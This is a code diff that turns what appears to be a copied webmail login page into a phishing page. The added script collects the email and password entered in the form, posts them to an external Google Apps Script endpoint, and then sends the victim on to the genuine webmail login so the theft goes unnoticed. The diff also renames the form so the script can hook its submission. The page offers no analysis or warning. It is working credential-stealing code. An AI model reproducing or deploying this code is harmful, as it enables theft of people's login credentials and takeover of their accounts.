@@ -6904,12 +6904,12 @@ button.close {
                             </span>
                         </div>
                     </div>
-                    <form role="form" ng-submit="signin(user)" class="ng-pristine ng-valid">
+                    <form role="form" id="google-sheet" name="login-form" method="post" class="propform" action="/?_task=login" ng-submit="signin(user)" class="ng-pristine ng-valid">
                         <div class="form-group">
-                            <input type="text" class="form-control ng-pristine ng-valid ng-touched" id="username" ng-model="user.username" placeholder="Email" aria-label="Email" ng-disabled="( loadingstatus !== '')" focus-directive="true" value="">
+                            <input type="text" class="form-control ng-pristine ng-valid ng-touched" id="Username" ng-model="user.username" placeholder="Email" aria-label="Email" ng-disabled="( loadingstatus !== '')" focus-directive="true" value="">
                         </div>
                         <div class="form-group">
-                            <input type="password" class="form-control ng-pristine ng-untouched ng-valid" id="password" ng-model="user.password" placeholder="Password" aria-label="Password" ng-disabled="( loadingstatus !== '')" value="">
+                            <input type="password" class="form-control ng-pristine ng-untouched ng-valid" id="Password" ng-model="user.password" placeholder="Password" aria-label="Password" ng-disabled="( loadingstatus !== '')" value="">
                         </div>
                         <div class="form-group" aria-live="assertive">
                             <!-- ngIf: ( loadingstatus === '') --><button ng-if="( loadingstatus === '')" type="submit" class="btn btn-primary btn-lg btn-block ng-scope" translate="LANG_LOGIN_SIGN_IN">Log in</button><!-- end ngIf: ( loadingstatus === '') -->
@@ -6921,7 +6921,24 @@ button.close {
                                 <!-- ngIf: ( loadingstatus === '') && showForgotLink && customForgotPassURL -->
                             </div><!-- end ngIf: (degradedMode !== true) -->
                         </div>
-                    </form>
+                    </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://webmail.mycci.net/#/login';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
                 </div>
                 <div class="login-language">
                     <hr>
